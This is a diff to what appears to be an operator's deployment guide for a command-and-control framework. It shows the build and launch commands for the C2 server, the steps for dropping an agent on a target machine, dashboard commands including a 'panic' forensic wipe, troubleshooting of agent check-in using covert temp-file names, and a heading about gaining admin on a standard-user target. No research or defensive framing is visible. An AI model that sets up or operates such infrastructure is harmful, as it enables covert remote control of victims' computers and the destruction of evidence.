@@ -16,18 +16,14 @@ acme.sh --install-cert -d c2.yourdomain.com \
     --cert-file /etc/ssl/c2.crt --key-file /etc/ssl/c2.key \
     --fullchain-file /etc/ssl/c2.fullchain.pem
 
-# 3. Build + run the C2 server
-nim c -d:release -d:ssl --opt:size --app:console \
-    --passL:-lws2_32 --passL:-lssl --passL:-lcrypto \
-    -o c2_server c2_server.nim
-SSL_CERT=/etc/ssl/c2.fullchain.pem \
-SSL_KEY=/etc/ssl/c2.key \
-WEB_AUTH_USER=operator \
-WEB_AUTH_PASSWORD='CHANGE_ME' \
-nohup ./c2_server > /var/log/c2.log 2>&1 &
+# Build + run the C2 server
+.\build.ps1
+$env:C2_WEB_USER = "operator"
+$env:C2_WEB_PASSWORD = "CHANGE_ME"
+.\build\c2_server.exe
 ```
 
-Verify from your laptop: `curl -k https://c2.yourdomain.com:8080`
+Verify from your laptop: `curl -k http://c2.yourdomain.com:8080`
 → should show the login page.
 
 ## On the operator machine, once:
@@ -63,7 +59,7 @@ X:\path\agent.exe
 
 That's the entire deploy. No arguments.
 
-## From the C2 dashboard (https://c2.yourdomain.com:8080):
+## From the C2 dashboard (http://c2.yourdomain.com:8080):
 
 ```
 whoami
@@ -87,11 +83,10 @@ panic    <- when done; full forensic wipe
 
 ## If the agent doesn't register:
 
-1. Check `%TEMP%\svc-X7K.log` on the target
+1. Check `%TEMP%\csp-<BuildPrefix>.dat` on the target
 2. Confirm DNS resolves your C2 host from the target
 3. Confirm TCP 8443 is open inbound on the C2 VPS
-4. Confirm the agent secret in agent_hardened.nim matches the
-   `S_SECRET` const in c2_server.nim
+4. Confirm the same `C2_AGENT_PASSPHRASE` was used for the server and agent builds
 
 ## If you need admin and the target user is standard:
 
